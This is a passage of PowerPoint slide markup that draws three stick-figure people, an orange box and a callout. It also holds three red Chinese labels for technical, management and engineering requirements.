              <a:ext cx="455613" cy="447675"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="287" cy="282"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="86" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="50" y="0"/>
                <a:ext cx="57" cy="57"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 86"/>
                  <a:gd name="T1" fmla="*/ 1 h 85"/>
                  <a:gd name="T2" fmla="*/ 1 w 86"/>
                  <a:gd name="T3" fmla="*/ 1 h 85"/>
                  <a:gd name="T4" fmla="*/ 1 w 86"/>
                  <a:gd name="T5" fmla="*/ 1 h 85"/>
                  <a:gd name="T6" fmla="*/ 1 w 86"/>
                  <a:gd name="T7" fmla="*/ 1 h 85"/>
                  <a:gd name="T8" fmla="*/ 1 w 86"/>
                  <a:gd name="T9" fmla="*/ 0 h 85"/>
                  <a:gd name="T10" fmla="*/ 1 w 86"/>
                  <a:gd name="T11" fmla="*/ 1 h 85"/>
                  <a:gd name="T12" fmla="*/ 1 w 86"/>
                  <a:gd name="T13" fmla="*/ 1 h 85"/>
                  <a:gd name="T14" fmla="*/ 1 w 86"/>
                  <a:gd name="T15" fmla="*/ 1 h 85"/>
                  <a:gd name="T16" fmla="*/ 0 w 86"/>
                  <a:gd name="T17" fmla="*/ 1 h 85"/>
                  <a:gd name="T18" fmla="*/ 1 w 86"/>
                  <a:gd name="T19" fmla="*/ 1 h 85"/>
                  <a:gd name="T20" fmla="*/ 1 w 86"/>
                  <a:gd name="T21" fmla="*/ 1 h 85"/>
                  <a:gd name="T22" fmla="*/ 1 w 86"/>
                  <a:gd name="T23" fmla="*/ 1 h 85"/>
                  <a:gd name="T24" fmla="*/ 1 w 86"/>
                  <a:gd name="T25" fmla="*/ 1 h 85"/>
                  <a:gd name="T26" fmla="*/ 1 w 86"/>
                  <a:gd name="T27" fmla="*/ 1 h 85"/>
                  <a:gd name="T28" fmla="*/ 1 w 86"/>
                  <a:gd name="T29" fmla="*/ 1 h 85"/>
                  <a:gd name="T30" fmla="*/ 1 w 86"/>
                  <a:gd name="T31" fmla="*/ 1 h 85"/>
                  <a:gd name="T32" fmla="*/ 1 w 86"/>
                  <a:gd name="T33" fmla="*/ 1 h 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6"/>
                  <a:gd name="T52" fmla="*/ 0 h 85"/>
                  <a:gd name="T53" fmla="*/ 86 w 86"/>
                  <a:gd name="T54" fmla="*/ 85 h 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6" h="85">
                    <a:moveTo>
                      <a:pt x="86" y="43"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="82" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="43"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="87" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="57"/>
                <a:ext cx="153" cy="225"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 230"/>
                  <a:gd name="T1" fmla="*/ 1 h 340"/>
                  <a:gd name="T2" fmla="*/ 1 w 230"/>
                  <a:gd name="T3" fmla="*/ 1 h 340"/>
                  <a:gd name="T4" fmla="*/ 1 w 230"/>
                  <a:gd name="T5" fmla="*/ 1 h 340"/>
                  <a:gd name="T6" fmla="*/ 1 w 230"/>
                  <a:gd name="T7" fmla="*/ 1 h 340"/>
                  <a:gd name="T8" fmla="*/ 1 w 230"/>
                  <a:gd name="T9" fmla="*/ 1 h 340"/>
                  <a:gd name="T10" fmla="*/ 1 w 230"/>
                  <a:gd name="T11" fmla="*/ 1 h 340"/>
                  <a:gd name="T12" fmla="*/ 1 w 230"/>
                  <a:gd name="T13" fmla="*/ 1 h 340"/>
                  <a:gd name="T14" fmla="*/ 1 w 230"/>
                  <a:gd name="T15" fmla="*/ 0 h 340"/>
                  <a:gd name="T16" fmla="*/ 1 w 230"/>
                  <a:gd name="T17" fmla="*/ 1 h 340"/>
                  <a:gd name="T18" fmla="*/ 1 w 230"/>
                  <a:gd name="T19" fmla="*/ 0 h 340"/>
                  <a:gd name="T20" fmla="*/ 0 w 230"/>
                  <a:gd name="T21" fmla="*/ 1 h 340"/>
                  <a:gd name="T22" fmla="*/ 1 w 230"/>
                  <a:gd name="T23" fmla="*/ 1 h 340"/>
                  <a:gd name="T24" fmla="*/ 1 w 230"/>
                  <a:gd name="T25" fmla="*/ 1 h 340"/>
                  <a:gd name="T26" fmla="*/ 1 w 230"/>
                  <a:gd name="T27" fmla="*/ 1 h 340"/>
                  <a:gd name="T28" fmla="*/ 1 w 230"/>
                  <a:gd name="T29" fmla="*/ 1 h 340"/>
                  <a:gd name="T30" fmla="*/ 1 w 230"/>
                  <a:gd name="T31" fmla="*/ 1 h 340"/>
                  <a:gd name="T32" fmla="*/ 1 w 230"/>
                  <a:gd name="T33" fmla="*/ 1 h 3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0"/>
                  <a:gd name="T52" fmla="*/ 0 h 340"/>
                  <a:gd name="T53" fmla="*/ 230 w 230"/>
                  <a:gd name="T54" fmla="*/ 340 h 3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0" h="340">
                    <a:moveTo>
                      <a:pt x="117" y="175"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="171" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="215" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="204" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="230" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="194" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="175"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="88" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="184" y="0"/>
                <a:ext cx="57" cy="57"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 86"/>
                  <a:gd name="T1" fmla="*/ 1 h 85"/>
                  <a:gd name="T2" fmla="*/ 1 w 86"/>
                  <a:gd name="T3" fmla="*/ 1 h 85"/>
                  <a:gd name="T4" fmla="*/ 1 w 86"/>
                  <a:gd name="T5" fmla="*/ 1 h 85"/>
                  <a:gd name="T6" fmla="*/ 1 w 86"/>
                  <a:gd name="T7" fmla="*/ 1 h 85"/>
                  <a:gd name="T8" fmla="*/ 1 w 86"/>
                  <a:gd name="T9" fmla="*/ 0 h 85"/>
                  <a:gd name="T10" fmla="*/ 1 w 86"/>
                  <a:gd name="T11" fmla="*/ 1 h 85"/>
                  <a:gd name="T12" fmla="*/ 1 w 86"/>
                  <a:gd name="T13" fmla="*/ 1 h 85"/>
                  <a:gd name="T14" fmla="*/ 1 w 86"/>
                  <a:gd name="T15" fmla="*/ 1 h 85"/>
                  <a:gd name="T16" fmla="*/ 0 w 86"/>
                  <a:gd name="T17" fmla="*/ 1 h 85"/>
                  <a:gd name="T18" fmla="*/ 1 w 86"/>
                  <a:gd name="T19" fmla="*/ 1 h 85"/>
                  <a:gd name="T20" fmla="*/ 1 w 86"/>
                  <a:gd name="T21" fmla="*/ 1 h 85"/>
                  <a:gd name="T22" fmla="*/ 1 w 86"/>
                  <a:gd name="T23" fmla="*/ 1 h 85"/>
                  <a:gd name="T24" fmla="*/ 1 w 86"/>
                  <a:gd name="T25" fmla="*/ 1 h 85"/>
                  <a:gd name="T26" fmla="*/ 1 w 86"/>
                  <a:gd name="T27" fmla="*/ 1 h 85"/>
                  <a:gd name="T28" fmla="*/ 1 w 86"/>
                  <a:gd name="T29" fmla="*/ 1 h 85"/>
                  <a:gd name="T30" fmla="*/ 1 w 86"/>
                  <a:gd name="T31" fmla="*/ 1 h 85"/>
                  <a:gd name="T32" fmla="*/ 1 w 86"/>
                  <a:gd name="T33" fmla="*/ 1 h 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6"/>
                  <a:gd name="T52" fmla="*/ 0 h 85"/>
                  <a:gd name="T53" fmla="*/ 86 w 86"/>
                  <a:gd name="T54" fmla="*/ 85 h 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6" h="85">
                    <a:moveTo>
                      <a:pt x="86" y="43"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="82" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="72" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="72" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="43"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="C0C0C0"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="89" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="134" y="57"/>
                <a:ext cx="153" cy="225"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 230"/>
                  <a:gd name="T1" fmla="*/ 1 h 340"/>
                  <a:gd name="T2" fmla="*/ 1 w 230"/>
                  <a:gd name="T3" fmla="*/ 1 h 340"/>
                  <a:gd name="T4" fmla="*/ 1 w 230"/>
                  <a:gd name="T5" fmla="*/ 1 h 340"/>
                  <a:gd name="T6" fmla="*/ 1 w 230"/>
                  <a:gd name="T7" fmla="*/ 1 h 340"/>
                  <a:gd name="T8" fmla="*/ 1 w 230"/>
                  <a:gd name="T9" fmla="*/ 1 h 340"/>
                  <a:gd name="T10" fmla="*/ 1 w 230"/>
                  <a:gd name="T11" fmla="*/ 1 h 340"/>
                  <a:gd name="T12" fmla="*/ 1 w 230"/>
                  <a:gd name="T13" fmla="*/ 1 h 340"/>
                  <a:gd name="T14" fmla="*/ 1 w 230"/>
                  <a:gd name="T15" fmla="*/ 0 h 340"/>
                  <a:gd name="T16" fmla="*/ 1 w 230"/>
                  <a:gd name="T17" fmla="*/ 1 h 340"/>
                  <a:gd name="T18" fmla="*/ 1 w 230"/>
                  <a:gd name="T19" fmla="*/ 0 h 340"/>
                  <a:gd name="T20" fmla="*/ 0 w 230"/>
                  <a:gd name="T21" fmla="*/ 1 h 340"/>
                  <a:gd name="T22" fmla="*/ 1 w 230"/>
                  <a:gd name="T23" fmla="*/ 1 h 340"/>
                  <a:gd name="T24" fmla="*/ 1 w 230"/>
                  <a:gd name="T25" fmla="*/ 1 h 340"/>
                  <a:gd name="T26" fmla="*/ 1 w 230"/>
                  <a:gd name="T27" fmla="*/ 1 h 340"/>
                  <a:gd name="T28" fmla="*/ 1 w 230"/>
                  <a:gd name="T29" fmla="*/ 1 h 340"/>
                  <a:gd name="T30" fmla="*/ 1 w 230"/>
                  <a:gd name="T31" fmla="*/ 1 h 340"/>
                  <a:gd name="T32" fmla="*/ 1 w 230"/>
                  <a:gd name="T33" fmla="*/ 1 h 3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0"/>
                  <a:gd name="T52" fmla="*/ 0 h 340"/>
                  <a:gd name="T53" fmla="*/ 230 w 230"/>
                  <a:gd name="T54" fmla="*/ 340 h 3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0" h="340">
                    <a:moveTo>
                      <a:pt x="117" y="175"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="171" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="215" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="203" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="230" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="192" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="175"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="C0C0C0"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="90" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="118" y="0"/>
                <a:ext cx="57" cy="57"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 86"/>
                  <a:gd name="T1" fmla="*/ 1 h 85"/>
                  <a:gd name="T2" fmla="*/ 1 w 86"/>
                  <a:gd name="T3" fmla="*/ 1 h 85"/>
                  <a:gd name="T4" fmla="*/ 1 w 86"/>
                  <a:gd name="T5" fmla="*/ 1 h 85"/>
                  <a:gd name="T6" fmla="*/ 1 w 86"/>
                  <a:gd name="T7" fmla="*/ 1 h 85"/>
                  <a:gd name="T8" fmla="*/ 1 w 86"/>
                  <a:gd name="T9" fmla="*/ 0 h 85"/>
                  <a:gd name="T10" fmla="*/ 1 w 86"/>
                  <a:gd name="T11" fmla="*/ 1 h 85"/>
                  <a:gd name="T12" fmla="*/ 1 w 86"/>
                  <a:gd name="T13" fmla="*/ 1 h 85"/>
                  <a:gd name="T14" fmla="*/ 1 w 86"/>
                  <a:gd name="T15" fmla="*/ 1 h 85"/>
                  <a:gd name="T16" fmla="*/ 0 w 86"/>
                  <a:gd name="T17" fmla="*/ 1 h 85"/>
                  <a:gd name="T18" fmla="*/ 1 w 86"/>
                  <a:gd name="T19" fmla="*/ 1 h 85"/>
                  <a:gd name="T20" fmla="*/ 1 w 86"/>
                  <a:gd name="T21" fmla="*/ 1 h 85"/>
                  <a:gd name="T22" fmla="*/ 1 w 86"/>
                  <a:gd name="T23" fmla="*/ 1 h 85"/>
                  <a:gd name="T24" fmla="*/ 1 w 86"/>
                  <a:gd name="T25" fmla="*/ 1 h 85"/>
                  <a:gd name="T26" fmla="*/ 1 w 86"/>
                  <a:gd name="T27" fmla="*/ 1 h 85"/>
                  <a:gd name="T28" fmla="*/ 1 w 86"/>
                  <a:gd name="T29" fmla="*/ 1 h 85"/>
                  <a:gd name="T30" fmla="*/ 1 w 86"/>
                  <a:gd name="T31" fmla="*/ 1 h 85"/>
                  <a:gd name="T32" fmla="*/ 1 w 86"/>
                  <a:gd name="T33" fmla="*/ 1 h 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6"/>
                  <a:gd name="T52" fmla="*/ 0 h 85"/>
                  <a:gd name="T53" fmla="*/ 86 w 86"/>
                  <a:gd name="T54" fmla="*/ 85 h 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6" h="85">
                    <a:moveTo>
                      <a:pt x="86" y="43"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="82" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="43"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="91" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="68" y="57"/>
                <a:ext cx="153" cy="225"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 230"/>
                  <a:gd name="T1" fmla="*/ 1 h 340"/>
                  <a:gd name="T2" fmla="*/ 1 w 230"/>
                  <a:gd name="T3" fmla="*/ 1 h 340"/>
                  <a:gd name="T4" fmla="*/ 1 w 230"/>
                  <a:gd name="T5" fmla="*/ 1 h 340"/>
                  <a:gd name="T6" fmla="*/ 1 w 230"/>
                  <a:gd name="T7" fmla="*/ 1 h 340"/>
                  <a:gd name="T8" fmla="*/ 1 w 230"/>
                  <a:gd name="T9" fmla="*/ 1 h 340"/>
                  <a:gd name="T10" fmla="*/ 1 w 230"/>
                  <a:gd name="T11" fmla="*/ 1 h 340"/>
                  <a:gd name="T12" fmla="*/ 1 w 230"/>
                  <a:gd name="T13" fmla="*/ 1 h 340"/>
                  <a:gd name="T14" fmla="*/ 1 w 230"/>
                  <a:gd name="T15" fmla="*/ 0 h 340"/>
                  <a:gd name="T16" fmla="*/ 1 w 230"/>
                  <a:gd name="T17" fmla="*/ 1 h 340"/>
                  <a:gd name="T18" fmla="*/ 1 w 230"/>
                  <a:gd name="T19" fmla="*/ 0 h 340"/>
                  <a:gd name="T20" fmla="*/ 0 w 230"/>
                  <a:gd name="T21" fmla="*/ 1 h 340"/>
                  <a:gd name="T22" fmla="*/ 1 w 230"/>
                  <a:gd name="T23" fmla="*/ 1 h 340"/>
                  <a:gd name="T24" fmla="*/ 1 w 230"/>
                  <a:gd name="T25" fmla="*/ 1 h 340"/>
                  <a:gd name="T26" fmla="*/ 1 w 230"/>
                  <a:gd name="T27" fmla="*/ 1 h 340"/>
                  <a:gd name="T28" fmla="*/ 1 w 230"/>
                  <a:gd name="T29" fmla="*/ 1 h 340"/>
                  <a:gd name="T30" fmla="*/ 1 w 230"/>
                  <a:gd name="T31" fmla="*/ 1 h 340"/>
                  <a:gd name="T32" fmla="*/ 1 w 230"/>
                  <a:gd name="T33" fmla="*/ 1 h 3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0"/>
                  <a:gd name="T52" fmla="*/ 0 h 340"/>
                  <a:gd name="T53" fmla="*/ 230 w 230"/>
                  <a:gd name="T54" fmla="*/ 340 h 3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0" h="340">
                    <a:moveTo>
                      <a:pt x="119" y="175"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="173" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="215" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="203" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="230" y="111"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="194" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="119" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="340"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="119" y="175"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="47" name="Rectangle 139"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4499992" y="4739098"/>
              <a:ext cx="2503488" cy="676275"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FFCC66"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="48" name="Rectangle 140"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4892104" y="4753385"/>
              <a:ext cx="71120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1400" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>技术要求</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr eaLnBrk="0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>管理要求</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr eaLnBrk="0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>工程要求</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="49" name="AutoShape 142"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="1782192" y="4818473"/>
              <a:ext cx="2035175" cy="396875"/>
            </a:xfrm>
            <a:prstGeom prst="cloudCallout">
              <a:avLst>
